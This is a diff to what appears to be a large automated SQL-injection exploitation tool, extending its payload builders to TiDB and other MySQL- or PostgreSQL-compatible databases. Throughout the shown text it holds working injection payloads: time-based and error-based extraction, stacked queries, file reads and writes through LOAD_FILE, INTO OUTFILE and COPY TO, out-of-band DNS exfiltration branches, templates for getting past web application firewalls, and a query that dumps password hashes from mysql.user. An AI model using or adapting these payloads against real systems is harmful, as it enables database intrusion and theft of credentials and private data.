+            # BUG-MSE-STACKED-TIDB FIX: TiDB is MySQL-wire-compatible; IF(), EXTRACTVALUE(),
+            # UPDATEXML(), CONCAT(), and 1/0 error semantics are identical to MySQL.
             if _method in ("extractval", "updatexml"):
                 p = self._build_stacked(
                     f"SELECT IF(({cond}),EXTRACTVALUE(1,CONCAT(0x7e,1)),1)")
@@ -139103,8 +140660,8 @@ class MultiStrategyExtractor:
                 # CASE WHEN gates the div-zero: true→0→1/0→ORA-01476, false→1→1/1→ok
                 p = self._build_inline(
                     f"1/CASE WHEN ({cond}) THEN 0 ELSE 1 END=1 AND 1=1")
-            elif self.dbms in ("MySQL", "MariaDB"):
-                # MySQL supports IF() inline; 1/0 errors in strict mode
+            elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+                # BUG-MSE-INLINE-TIDB FIX: TiDB is MySQL-wire-compatible; IF() inline is valid.
                 p = self._build_inline(f"IF(({cond}),1/0,1)=1")
             elif self.dbms in ("MSSQL",):
                 # MSSQL: CASE WHEN gate, same pattern as Oracle
@@ -139219,7 +140776,9 @@ class MultiStrategyExtractor:
                 ("xjoin4", self._build_stacked(f"SELECT COUNT(*) FROM {_tbl} a,{_tbl} b,{_tbl} c,{_tbl} d") if self._stacked
                     else self._build_inline(f"(SELECT COUNT(*) FROM {_tbl} a,{_tbl} b,{_tbl} c,{_tbl} d)>0")),
             ]
-        elif self.dbms in ("MySQL", "MariaDB"):
+        elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-MSE-HEAVY-TIDB FIX: TiDB is MySQL-wire-compatible; BENCHMARK()
+            # and cross-join heavy queries are valid TiDB SQL.
             _heavy_variants = [
                 ("benchmark", self._build_stacked("SELECT BENCHMARK(5000000,SHA1('x'))") if self._stacked
                     else self._build_inline("BENCHMARK(5000000,SHA1('x'))=0")),
@@ -139294,8 +140853,8 @@ class MultiStrategyExtractor:
                 p = self._build_stacked(f"SELECT COUNT(*) FROM generate_series(1, ({cond})::int * 500000)")
             else:
                 p = self._build_inline(f"(SELECT COUNT(*) FROM generate_series(1, ({cond})::int * 500000))>=0")
-        elif self.dbms in ("MySQL", "MariaDB") and "benchmark" in _label:
-            # BENCHMARK: condition multiplies iteration count
+        elif self.dbms in ("MySQL", "MariaDB", "TiDB") and "benchmark" in _label:
+            # BUG-MSE-EVAL-HEAVY-TIDB FIX: TiDB is MySQL-wire-compatible; BENCHMARK() is valid.
             if self._heavy_info["stacked"]:
                 p = self._build_stacked(f"SELECT BENCHMARK(({cond})*5000000, SHA1('x'))")
             else:
@@ -139406,7 +140965,8 @@ class MultiStrategyExtractor:
             else:
                 p1 = self._build_inline(f"(SELECT COUNT(*) FROM {_tbl} a,{_tbl} b WHERE get_bit('A'::bytea,1)=1)>0")
                 p0 = self._build_inline(f"(SELECT COUNT(*) FROM {_tbl} a,{_tbl} b WHERE get_bit('A'::bytea,7)=1)>0")
-        elif self.dbms in ("MySQL", "MariaDB"):
+        elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-MSE-BITWISE-TIDB FIX: TiDB is MySQL-wire-compatible; ORD(), >>, and & are valid.
             if self._stacked:
                 p1 = self._build_stacked(f"SELECT COUNT(*) FROM {_tbl} a,{_tbl} b WHERE ((ORD('A')>>6)&1)=1")
                 p0 = self._build_stacked(f"SELECT COUNT(*) FROM {_tbl} a,{_tbl} b WHERE ((ORD('A')>>7)&1)=1")
@@ -139507,12 +141067,16 @@ class MultiStrategyExtractor:
         if not self._stacked:
             return False
         _methods = []
-        if self.dbms in ("PostgreSQL",):
+        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB"):
+            # BUG-MSE-OOB-PG-CRDB FIX: CockroachDB/YugabyteDB support COPY TO and lo_ functions.
+            # Amazon Redshift does NOT support lo_from_bytea or filesystem COPY TO.
             _methods = [
                 ("copy",   self._build_stacked("COPY (SELECT 1) TO '/tmp/_sqr_probe'")),
                 ("lo",     self._build_stacked("SELECT lo_from_bytea(0, 'test')")),
             ]
-        elif self.dbms in ("MySQL", "MariaDB"):
+        elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-MSE-OOB-TIDB FIX: TiDB is MySQL-wire-compatible; INTO OUTFILE and LOAD_FILE
+            # are present in TiDB's MySQL-compatible layer (availability depends on privileges).
             _methods = [
                 ("outfile", self._build_stacked("SELECT 1 INTO OUTFILE '/tmp/_sqr_probe'")),
                 ("loadf",   self._build_stacked("SELECT LOAD_FILE('/etc/hostname')")),
@@ -139632,7 +141196,9 @@ class MultiStrategyExtractor:
                     _num_true = _pre + f"(1>0)::int*{_nv}" + _suf
                     _num_false = _pre + f"(1>2)::int*{_nv}" + _suf
                     _num_cond = _pre + "({cond})::int*" + str(_nv) + _suf
-                elif self.dbms in ("MySQL", "MariaDB"):
+                elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-MSE-NUMREPLACE-TIDB FIX: TiDB is MySQL-wire-compatible;
+                    # boolean arithmetic (1>0)*N is valid TiDB SQL.
                     _num_true = _pre + f"(1>0)*{_nv}" + _suf
                     _num_false = _pre + f"(1>2)*{_nv}" + _suf
                     _num_cond = _pre + "({cond})*" + str(_nv) + _suf
@@ -139688,7 +141254,9 @@ class MultiStrategyExtractor:
                         ("stk_genseries", f"{_stk_prefix}SELECT COUNT(*) FROM generate_series(1,{{cond_expr}}){_stk_suffix}",
                                         "({cond})::int*500000", "(1>0)::int*500000", "(1>2)::int*500000"),
                     ]
-                elif self.dbms in ("MySQL", "MariaDB"):
+                elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-MSE-STK-TIMING-TIDB FIX: TiDB is MySQL-wire-compatible;
+                    # SLEEP() and BENCHMARK() are valid TiDB functions.
                     _stk_payloads = [
                         ("stk_sleep",   f"{_stk_prefix}SELECT SLEEP({{cond_expr}}){_stk_suffix}",
                                         "({cond})*5", "(1>0)*5", "(1>2)*5"),
@@ -140214,7 +141782,9 @@ class MultiStrategyExtractor:
                     # CHAR_LENGTH(current_catalog)>99999 → FALSE (names never > 99999 chars)
                     _real_true = "CHAR_LENGTH(current_catalog)>0"
                     _real_false = "CHAR_LENGTH(current_catalog)>99999"
-                elif self.dbms in ("MySQL", "MariaDB"):
+                elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-MSE-REALCOND-TIDB FIX: TiDB is MySQL-wire-compatible; @@version,
+                    # ISNULL(), NULLIF() are all valid TiDB system functions.
                     # BUG-MYSQL-REAL-COND-WAF FIX (HIGH, MySQL/MariaDB, MSE oracle validation,
                     # all extraction techniques, all surfaces, all HTTP methods):
                     # The previous conditions used LENGTH(@@version)>0 and
@@ -140607,7 +142177,8 @@ class MultiStrategyExtractor:
             if self._stacked:
                 if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                     _test_p = self._build_stacked("SELECT pg_sleep(2)")
-                elif self.dbms in ("MySQL", "MariaDB"):
+                elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-MSE-WAFDISCOVERY-TIDB FIX: TiDB is MySQL-wire-compatible; SLEEP() valid.
                     _test_p = self._build_stacked("SELECT SLEEP(2)")
                 elif self.dbms in ("MSSQL", "Sybase"):
                     _test_p = self._build_stacked("WAITFOR DELAY '0:0:2'")
@@ -140641,7 +142212,8 @@ class MultiStrategyExtractor:
     async def discover_columns_orderby(self, table):
         """Discover column count via ORDER BY probing (no information_schema)."""
         print(f"[MSE] ORDER BY column discovery for {table}...", flush=True)
-        sep = '`' if self.dbms in ("MySQL", "MariaDB") else ''
+        # BUG-MSE-ORDERBY-SEP-TIDB FIX: TiDB uses backtick quoting like MySQL.
+        sep = '`' if self.dbms in ("MySQL", "MariaDB", "TiDB") else ''
         _sep_close = ']' if sep == '[' else sep
 
         # Binary search for column count: ORDER BY N  error when N > col_count
@@ -140728,7 +142300,8 @@ class MultiStrategyExtractor:
             sep, _sep_close = '"', '"'
         elif self.dbms == "Oracle":
             sep, _sep_close = '"', '"'
-        elif self.dbms in ("MySQL", "MariaDB"):
+        elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-MSE-COLNAMES-SEP-TIDB FIX: TiDB is MySQL-wire-compatible; backtick quoting valid.
             sep, _sep_close = '`', '`'
         else:
             sep, _sep_close = '', ''
@@ -141381,7 +142954,8 @@ class MultiStrategyExtractor:
         """Enhanced table extraction with charset opt, adaptive delay, resume."""
         if not self._oracles:
             return ""
-        if self.dbms in ("MySQL", "MariaDB"):
+        if self.dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-MSE-EXTRACT-TABLE-TIDB FIX: TiDB uses backtick quoting like MySQL.
             sep, _sep_close = '`', '`'
         elif self.dbms in ("MSSQL", "Sybase"):
             sep, _sep_close = '[', ']'
@@ -141406,7 +142980,7 @@ class MultiStrategyExtractor:
         _use_from = ("sleep_arith" in self._oracles and
                      self._stacked and
                      self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
-                                   "MySQL", "MariaDB"))
+                                   "MySQL", "MariaDB", "TiDB"))  # BUG-MSE-FROM-TIDB FIX: TiDB is MySQL-wire-compatible, supports stacked queries and sleep_arith
 
         # BUG-EFT-PAGINATION FIX: Build DBMS-specific row-at-offset subquery for the non-timing
         # path. The original code used "LIMIT 1 OFFSET {offset}" for ALL DBMSes. MSSQL requires
@@ -141418,8 +142992,8 @@ class MultiStrategyExtractor:
             """Return a scalar subquery selecting col_expr at row=offset from table."""
             _tbl = f"{sep}{table}{_sep_close}"
             _col = col_expr
-            if self.dbms in ("MySQL", "MariaDB", "PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "SQLite",
-                             "H2", "SAP_HANA", "ClickHouse", "DuckDB"):
+            if self.dbms in ("MySQL", "MariaDB", "TiDB", "PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "SQLite",
+                             "H2", "SAP_HANA", "ClickHouse", "DuckDB"):  # BUG-MSE-ROWSUBQ-TIDB FIX: TiDB supports LIMIT/OFFSET syntax identical to MySQL
                 return f"(SELECT {_col} FROM {_tbl} LIMIT 1 OFFSET {offset})"
             elif self.dbms in ("MSSQL", "Sybase"):
                 # OFFSET/FETCH requires ORDER BY; use (SELECT NULL) as a stable sort key.
@@ -141898,7 +143472,13 @@ class SideChannelExtractor:
                         "concat_arith",
                         f"{self._prefix}(1/(1-(1>0)::int))::text{self._suffix}",
                         f"{self._prefix}(1/(1-(1>2)::int))::text{self._suffix}"))
-        elif self.dbms in ("MySQL", "MariaDB"):
+        elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-SCE-TIDB-WHERE-ERROR FIX: TiDB was missing from MySQL/MariaDB branch.
+            # TiDB is MySQL-wire-compatible: IF() and SELECT 1/0 WHERE are valid TiDB SQL.
+            # Without this fix, TiDB fell to the generic fallback which emits bare
+            # "SELECT 1/0 WHERE 1>0" in non-stacked context — invalid SQL in a WHERE clause
+            # (no subquery wrapping), so probe always fails and WHERE-ERROR channel is never
+            # available for non-stacked TiDB injections.
             _stk = self._stacked
             _strategies = [
                 ("mysql_if",
@@ -142918,7 +144498,10 @@ class SideChannelExtractor:
                 _methods.append(("dblink_c0",
                                  f"{self._prefix}AND (SELECT dblink_connect({_conn_c0})) IS NOT NULL{self._suffix}",
                                  "dblink_connect DNS chunk 0 fallback (needs dblink extension)"))
-        elif self.dbms in ("MySQL", "MariaDB"):
+        elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-SCE-TIDB-OOB FIX: TiDB was missing from MySQL/MariaDB branch.
+            # TiDB is MySQL-wire-compatible: LOAD_FILE() and HEX() are valid TiDB functions.
+            # Without this fix, TiDB fell to the `if not _methods` guard → no OOB methods.
             # BUG-DNS-EXFIL-NONSTACK-CONTEXT FIX: For non-stacked detections (B/E/T),
             # self._prefix = "' " (boolean context), so
             #   "{self._prefix}SELECT LOAD_FILE(...){self._suffix}"
@@ -143728,7 +145311,11 @@ class SideChannelExtractor:
                 # for the stacked vs. inline context. extract_where_error() will use
                 # this strategy to build extraction payloads — it does not re-validate.
                 if self._stacked:
-                    if self.dbms in ("MySQL", "MariaDB"):
+                    if self.dbms in ("MySQL", "MariaDB", "TiDB"):
+                        # BUG-SCE-TIDB-CH3-STRATEGY FIX: TiDB missing from MySQL/MariaDB
+                        # branch. Fell to else→"where_div" (PostgreSQL-specific stacked
+                        # arithmetic). _build_error_cond("where_div") uses ::int cast (PG
+                        # syntax) → SQL syntax error on TiDB → channel 3 always silent.
                         self._error_strategy = "mysql_if"
                     elif self.dbms in ("MSSQL", "Sybase"):
                         self._error_strategy = "mssql_if"
@@ -143746,7 +145333,10 @@ class SideChannelExtractor:
                     if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB",
                                      "Amazon Redshift"):
                         self._error_strategy = "arith_inline"
-                    elif self.dbms in ("MySQL", "MariaDB"):
+                    elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+                        # BUG-SCE-TIDB-CH3-STRATEGY FIX: TiDB missing from MySQL/MariaDB
+                        # branch. Fell to else→"arith_inline" (::int PG cast syntax) →
+                        # SQL syntax error on TiDB → channel 3 always silent for non-stacked.
                         self._error_strategy = "mysql_if"
                     elif self.dbms in ("MSSQL", "Sybase"):
                         self._error_strategy = "mssql_if"
@@ -143924,7 +145514,14 @@ class ExtractionBypassFinder:
                 f"' AND (SELECT CASE WHEN (1=1) THEN pg_sleep({T}e0 * cast(({{cond}}) as int)) ELSE pg_sleep(0) END) IS NOT NULL-- -",
                 f"'; SELECT CASE WHEN (1=1) THEN pg_sleep({Tx} * ({{cond}})::int) ELSE pg_sleep(0x0) END-- -",
             ]
-        elif dbms in ("MySQL", "MariaDB"):
+        elif dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-EBF-TIDB-TEMPLATES FIX: TiDB was missing from MySQL/MariaDB branch.
+            # TiDB is MySQL-wire-compatible: SLEEP() and IF() are valid TiDB functions.
+            # Without this fix, TiDB fell to the generic else → templates with pg_sleep()
+            # which does not exist in TiDB → both EBF templates always return fast (wrong
+            # DBMS function → SQL error → 500 in < 100ms) → EBF cannot find a working
+            # bypass template → timing-based extraction permanently falls back to
+            # uncalibrated static payloads for all TiDB WAF-protected targets.
             return [
                 # Arithmetic: condition inside SLEEP arg  not in CASE WHEN/WHERE
                 f"'; SELECT SLEEP(({{cond}}) * {T})-- -",
@@ -145278,8 +146875,10 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                     mod = T.replace_function_arg(p, r"pg_sleep", arith_arg)
                     if mod: return mod, []
 
-                elif form in ("arith_mysql", "mysql_if", "mysql_if_bench") and dbms in ("MySQL", "MariaDB"):
+                elif form in ("arith_mysql", "mysql_if", "mysql_if_bench") and dbms in ("MySQL", "MariaDB", "TiDB"):
                     # BUG-E FIX: arith_mysql uses SLEEP(cond*t); mysql_if uses IF(cond,SLEEP,0)
+                    # BUG-MAKEPAYLOAD-ARITH-MYSQL-TIDB FIX: TiDB is MySQL-wire-compatible;
+                    # SLEEP() and IF() are both valid TiDB functions.
                     if form == "arith_mysql":
                         arith_arg = f"({condition}) * {t}"
                         mod = T.replace_function_arg(p, r"SLEEP", arith_arg)
@@ -145298,7 +146897,9 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                     mod = T.wrap_in_subquery_where(p, condition, t)
                     if mod: return mod, []
 
-                elif form in ("heavy_computation_mysql", "cross_join_mysql") and dbms in ("MySQL", "MariaDB"):
+                elif form in ("heavy_computation_mysql", "cross_join_mysql") and dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-MAKEPAYLOAD-HEAVY-MYSQL-TIDB FIX: TiDB supports information_schema
+                    # cross-join heavy computation identical to MySQL/MariaDB.
                     # BUG-MAKEPAYLOAD-HEAVY-MYSQL-NONCOND FIX (CRITICAL):
                     # Two compounding bugs in the previous implementation:
                     # Bug A: Used WHERE clause (same non-conditionality root cause as
@@ -145393,7 +146994,7 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                         if mod:
                             LOG.debug(f"[TBExtract] pg_sleep CASE WHEN: {mod[:80]!r}")
                             return mod, []
-                    elif dbms in ("MySQL", "MariaDB"):
+                    elif dbms in ("MySQL", "MariaDB", "TiDB"):
                         mod = T.replace_function_call(p, r"SLEEP",
                                                        f"IF(({condition}),SLEEP({t}),0)")
                         if mod: return mod, []
@@ -145999,6 +147600,38 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                                    " AND table_schema != 'sys'"
                                    " ORDER BY 1 LIMIT 1)"),
         },
+        # BUG-NOFUNC-TIDB FIX: TiDB is MySQL-wire-compatible; nofunc remaps must use MySQL
+        # forms, not PostgreSQL forms. Without this entry TiDB fell to the PostgreSQL remap
+        # fallback (line below: _NOFUNC_REMAP_ALL.get("PostgreSQL", {})), causing database()
+        # to be remapped to current_catalog (PG-only, invalid in TiDB → SQL error → empty
+        # result) and current_database() to current_catalog (same problem).
+        # TiDB version() → @@version (TiDB supports @@version as MySQL-compat system var).
+        # TiDB database() → MySQL subquery form (identical to MySQL/MariaDB entry above).
+        "TiDB": {
+            "version()":          "@@version",
+            "current_user()":     "current_user",
+            "user()":             "user",
+            "database()":         ("(SELECT table_schema FROM information_schema.tables"
+                                   " WHERE table_schema != 'information_schema'"
+                                   " AND table_schema != 'performance_schema'"
+                                   " AND table_schema != 'mysql'"
+                                   " AND table_schema != 'sys'"
+                                   " ORDER BY 1 LIMIT 1)"),
+        },
+        # BUG-NOFUNC-YUGABYTE FIX: YugabyteDB is PG-wire-compatible; PG nofunc remaps apply.
+        "YugabyteDB": {
+            "current_database()": "current_catalog",
+            "current_schema()":   "current_schema",
+            "current_user()":     "current_user",
+            "user()":             "current_user",
+            "database()":         "current_catalog",
+        },
+        # BUG-NOFUNC-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible; PG nofunc remaps apply.
+        "Amazon Redshift": {
+            "current_database()": "current_catalog",
+            "current_user()":     "current_user",
+            "database()":         "current_catalog",
+        },
         "MSSQL": {
             # db_name() and user_name() have no valid nofunc form in MSSQL;
             # omitting them so the query is not remapped to an invalid form.
@@ -146321,8 +147954,9 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 if 0xD800 <= _nf_bound <= 0xDFFF:
                     _nf_bound = 0xE000
                 _nf_cmp = _nofunc_prefix + chr(_nf_bound)
-                if dbms in ("MySQL", "MariaDB"):
-                    # MySQL hex literal: 0x48656C6C6F  no quotes, no parens
+                if dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-NOFUNC-HEX-TIDB FIX: TiDB supports 0x{hex} hex literals like MySQL.
+                    # MySQL/TiDB hex literal: 0x48656C6C6F  no quotes, no parens
                     _hex = _nf_cmp.encode("utf-8", errors="surrogatepass").hex()
                     # BUG-NOFUNC-ATAT-WAF: Imperva (and similar signature-based WAFs)
                     # pattern-match on bare `@@variable>=` comparisons as a SQLi indicator.
@@ -146759,7 +148393,9 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
         # For MySQL/MariaDB: count any char outside printable ASCII (0x20-0x7E) as
         # noise, and use a 10% threshold (real system metadata is pure ASCII, so even
         # 1-2 non-ASCII chars in a short string indicates a broken oracle).
-        if dbms in ("MySQL", "MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-GARBAGE-TIDB-PRINTABLE FIX: TiDB system metadata (@@version, DATABASE(),
+            # USER()) is also ASCII-only; apply the same strict 10% ASCII-only threshold.
             _non_print = sum(1 for c in result_str
                              if ord(c) < 0x20 or ord(c) == 0x7f or ord(c) > 0x7e)
             _noise_threshold = 0.10
@@ -146768,10 +148404,29 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             _noise_threshold = 0.40
         _noise_ratio = _non_print / len(result_str)
         if _noise_ratio > _noise_threshold:
+            # Distinguish the two failure modes so operators can diagnose the root cause:
+            #   TOO HIGH threshold (thresh > baseline + sleep_ms):
+            #       Sleep never clears threshold → oracle always False → binary search
+            #       converges to lo=0 → every character extracted as chr(0) → NUL-byte garbage.
+            #       Message: "unreachable" — threshold cannot be reached even with sleep firing.
+            #   TOO LOW threshold (thresh ≤ baseline + jitter):
+            #       Baseline response jitter alone exceeds threshold → oracle always True
+            #       → binary search converges to max codepoint → supplementary-plane garbage.
+            #       Message: "non-conditional" — threshold is so low it fires without sleep.
+            _sleep_ms = t * 1000
+            _thresh_too_high = timing_thresh > _base_time + _sleep_ms
+            _oracle_diagnosis = (
+                f"thresh={timing_thresh:.0f}ms unreachable (sleep={t}s adds {_sleep_ms:.0f}ms "
+                f"above baseline={_base_time:.0f}ms → expected peak={_base_time + _sleep_ms:.0f}ms "
+                f"< thresh) → oracle always-False → chr(0) garbage"
+                if _thresh_too_high else
+                f"thresh={timing_thresh:.0f}ms non-conditional (baseline={_base_time:.0f}ms jitter "
+                f"alone exceeds threshold without sleep={t}s firing) → oracle always-True "
+                f"→ max-codepoint garbage"
+            )
             print(f"[!] [TBExtract] GARBAGE GUARD: {_noise_ratio:.0%} non-printable "
-                  "characters in extracted string  timing oracle is noise "
-                  f"(thresh={timing_thresh:.0f}ms unreachable with sleep={t}s "
-                  f"baseline={_base_time:.0f}ms). Discarding result and invalidating "
+                  f"characters in extracted string — timing oracle is noise "
+                  f"({_oracle_diagnosis}). Discarding result and invalidating "
                   "calibration cache to force re-calibration.", flush=True)
             LOG.warning("[TBExtract] Garbage result discarded (noise_ratio=%.0f%%)", _noise_ratio*100)
             result_str = ""
@@ -149846,8 +151501,13 @@ DBMS_QUERIES_EXTENSION: Dict[str, Dict[str, str]] = {
         "row":          "SELECT CONCAT_WS('|',{cols}) FROM `{db}`.`{table}` LIMIT 1 OFFSET {offset}",
         "users":        "SELECT GROUP_CONCAT(User ORDER BY User SEPARATOR ',') FROM mysql.user",
         "char_func":    "COALESCE(ORD(MID(({query}),{pos},1)),0)",
+        "char_func_hex":"HEX(MID(({query}),{pos},1))",
         "substr":       "MID(({query}),{pos},1)",
-        "len_func":     "CHAR_LENGTH(({query}))",
+        # BUG-TIDB-DBMSQ-LENF FIX: CHAR_LENGTH without COALESCE returns NULL when query
+        # returns NULL; binary search receives NULL >= mid → UNKNOWN (three-valued logic)
+        # → bisection always takes hi=mid path → converges to 0 → extraction returns "".
+        # COALESCE converts NULL length to 0 (empty string), matching MySQL/MariaDB fix.
+        "len_func":     "COALESCE(CHAR_LENGTH(({query})),0)",
         "if_func":      "IF(({cond}),{t},{f})",
         "privileges":   "SELECT GROUP_CONCAT(DISTINCT PRIVILEGE_TYPE SEPARATOR ',') FROM INFORMATION_SCHEMA.USER_PRIVILEGES",
     },
@@ -149881,6 +151541,7 @@ DBMS_QUERIES_EXTENSION: Dict[str, Dict[str, str]] = {
         "row":          "SELECT concat_ws('|',{cols}) FROM \"{db}\".\"{table}\" OFFSET {offset} LIMIT 1",
         "users":        "SELECT string_agg(rolname,',') FROM pg_roles WHERE rolcanlogin",
         "char_func":    "ASCII(SUBSTR(({query}),{pos},1))",
+        "char_func_hex":"encode(SUBSTR(({query}),{pos},1)::bytea,'hex')",
         "substr":       "SUBSTR(({query}),{pos},1)",
         "len_func":     "LENGTH(({query}))",
         "if_func":      "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
@@ -151132,6 +152793,44 @@ class ExtractionOrchestrator:
                     # slow FALSE probes evaluate to False and fast TRUE probes to True.
                     # Threshold is set between the two baselines with enough buffer for
                     # typical ±20ms jitter.
+                    #
+                    # BUG-R5-FIX (CRITICAL): False-positive inverted oracle when WAF blocks
+                    # both calibration payloads.  Root cause: WAF blocks CASE WHEN / IF()
+                    # inside detection template → both TRUE and FALSE probes return fast WAF
+                    # rejection (~133ms/~315ms with different per-rule latency).  Since
+                    # TRUE < FALSE, the inverted-oracle branch fires.  But neither probe
+                    # shows genuine sleep signal → oracle will always evaluate TRUE for both
+                    # conditions → binary search converges to max → garbage extraction.
+                    # Guard: require the SLOW probe (max of true/false) to exceed
+                    # baseline + sleep*0.4 — the same threshold that _cal_hit() uses.
+                    # If neither probe shows sleep signal, the oracle is non-functional
+                    # (WAF blocks all payloads regardless of SQL condition), NOT inverted.
+                    _dt_base_ms = (self.baseline.get('mean_timing', 200)
+                                   if isinstance(self.baseline, dict) else 200.0)
+                    _dt_base_ms = max(_dt_base_ms, 100.0)  # CDN floor
+                    _dt_sleep_ms = float(_delay) * 1000.0
+                    _dt_sleep_evidence_floor = _dt_base_ms + _dt_sleep_ms * 0.4
+                    _dt_max_probe_ms = max(_best_ms_t, _best_ms_f)
+                    if _dt_max_probe_ms < _dt_sleep_evidence_floor:
+                        # Neither probe reached the sleep-evidence floor.  The timing
+                        # difference is WAF-processing-latency variance, not SQL
+                        # polarity.  Treating this as an inverted oracle would cause
+                        # extraction probes to uniformly evaluate True (both WAF-blocked
+                        # responses are fast) → garbage output.  Abort instead.
+                        LOG.warning(
+                            "[DetTemplate] Inverted-oracle candidate rejected: "
+                            "max_probe=%.0fms < sleep_evidence_floor=%.0fms "
+                            "(base=%.0fms sleep=%.0fs) — WAF blocking both payloads, "
+                            "not a genuine polarity inversion; aborting.",
+                            _dt_max_probe_ms, _dt_sleep_evidence_floor,
+                            _dt_base_ms, _delay)
+                        print(
+                            f"[!] [DetTemplate] WAF blocks both calibration payloads "
+                            f"(TRUE={_best_ms_t:.0f}ms FALSE={_best_ms_f:.0f}ms) — "
+                            f"no sleep signal (floor={_dt_sleep_evidence_floor:.0f}ms); "
+                            f"detection template extraction unavailable for this WAF.",
+                            flush=True)
+                        return ""
                     self._dt_thresh   = max(
                         (_best_ms_t + _best_ms_f) / 2,
                         _best_ms_t + 30,
@@ -152073,9 +153772,13 @@ class ExtractionOrchestrator:
         _bool_oracle_functional = True  # assume functional until proven otherwise
         if _norm_tech in {"B", "BH", "IN", "BT"}:
             try:
-                _bov_true_map  = {"MySQL":"1<2","MariaDB":"1<2","PostgreSQL":"1<2",
+                _bov_true_map  = {"MySQL":"1<2","MariaDB":"1<2","TiDB":"1<2",
+                                  "PostgreSQL":"1<2","CockroachDB":"1<2","YugabyteDB":"1<2",
+                                  "Amazon Redshift":"1<2",
                                   "MSSQL":"1<2","SQLite":"1<2","Oracle":"1<2"}
-                _bov_false_map = {"MySQL":"1>2","MariaDB":"1>2","PostgreSQL":"1>2",
+                _bov_false_map = {"MySQL":"1>2","MariaDB":"1>2","TiDB":"1>2",
+                                  "PostgreSQL":"1>2","CockroachDB":"1>2","YugabyteDB":"1>2",
+                                  "Amazon Redshift":"1>2",
                                   "MSSQL":"1>2","SQLite":"1>2","Oracle":"1>2"}
                 _bov_true_cond  = _bov_true_map.get(dbms, "1<2")
                 _bov_false_cond = _bov_false_map.get(dbms, "1>2")
@@ -153682,6 +155385,44 @@ DBMS_EXTENDED: Dict[str, Dict[str, str]] = {
         "version_full":   "SELECT version()||'/'||current_setting('server_encoding')",
         "sortkeys":       "SELECT listagg(column_name,',') WITHIN GROUP (ORDER BY sortkey) FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}' AND sortkey>0",
         "distkey":        "SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}' AND distkey=1 LIMIT 1",
+    },
+    # BUG-DBMSEXT-TIDB FIX: TiDB was absent from DBMS_EXTENDED; extended keys
+    # (passwords, indexes, rows_chunked, char_func_hex, etc.) were never merged
+    # into DBMS_QUERIES["TiDB"], causing all extended-key extraction to use the
+    # MySQL fallback (which uses backtick-quoting for db.table) — already compat,
+    # but TiDB-specific functions and metadata paths were missing.
+    "TiDB": {
+        "passwords":      "SELECT GROUP_CONCAT(user,':',authentication_string ORDER BY user SEPARATOR '|') FROM mysql.user",
+        "schemas":        "SELECT GROUP_CONCAT(SCHEMA_NAME ORDER BY SCHEMA_NAME SEPARATOR ',') FROM information_schema.SCHEMATA WHERE SCHEMA_NAME NOT IN ('information_schema','performance_schema','mysql','sys')",
+        "indexes":        "SELECT GROUP_CONCAT(DISTINCT INDEX_NAME SEPARATOR ',') FROM information_schema.STATISTICS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{table}'",
+        "fks":            "SELECT GROUP_CONCAT(CONSTRAINT_NAME,':',REFERENCED_TABLE_NAME ORDER BY CONSTRAINT_NAME SEPARATOR '|') FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{table}' AND REFERENCED_TABLE_NAME IS NOT NULL",
+        "triggers":       "SELECT GROUP_CONCAT(TRIGGER_NAME ORDER BY TRIGGER_NAME SEPARATOR ',') FROM information_schema.TRIGGERS WHERE TRIGGER_SCHEMA='{db}'",
+        "procs":          "SELECT GROUP_CONCAT(ROUTINE_NAME ORDER BY ROUTINE_NAME SEPARATOR ',') FROM information_schema.ROUTINES WHERE ROUTINE_SCHEMA='{db}'",
+        "col_types":      "SELECT GROUP_CONCAT(COLUMN_NAME,':',COLUMN_TYPE ORDER BY ORDINAL_POSITION SEPARATOR '|') FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{table}'",
+        "rows_chunked":   "SELECT GROUP_CONCAT({cols} ORDER BY 1 SEPARATOR '||R||') FROM (SELECT {cols} FROM `{db}`.`{table}` LIMIT {limit} OFFSET {offset}) t",
+        "char_func_hex":  "HEX(MID(({query}),{pos},1))",
+        "version_full":   "SELECT TIDB_VERSION()",
+        "collation":      "SELECT @@collation_database",
+        "charset":        "SELECT GROUP_CONCAT(CHARACTER_SET_NAME ORDER BY CHARACTER_SET_NAME SEPARATOR ',') FROM information_schema.CHARACTER_SETS",
